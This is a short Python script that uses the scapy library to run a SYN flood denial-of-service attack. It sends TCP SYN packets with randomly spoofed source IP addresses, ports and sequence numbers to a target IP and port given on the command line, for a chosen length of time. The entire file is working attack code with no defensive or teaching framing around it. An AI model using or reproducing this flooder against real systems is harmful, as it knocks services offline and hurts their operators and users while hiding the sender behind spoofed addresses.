import os
from scapy.all import *
import time
import sys


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, timer):
    total = 0
    print("Packets are sending ...")
    start_time = time.time()
    while (time.time() - start_time) < timer:
        s_port = randInt()
        s_eq = randInt()
        window = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = window

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1

    print("\nTotal packets sent: %i\n" % total)


if __name__ == "__main__":
    target_ip = sys.argv[1]
    starting_port = int(sys.argv[2])
    timeout = int(sys.argv[3])
    print("Attack Starting on IP", target_ip)
    sent = 0
    port = starting_port
    SYN_Flood(target_ip, starting_port, timeout)
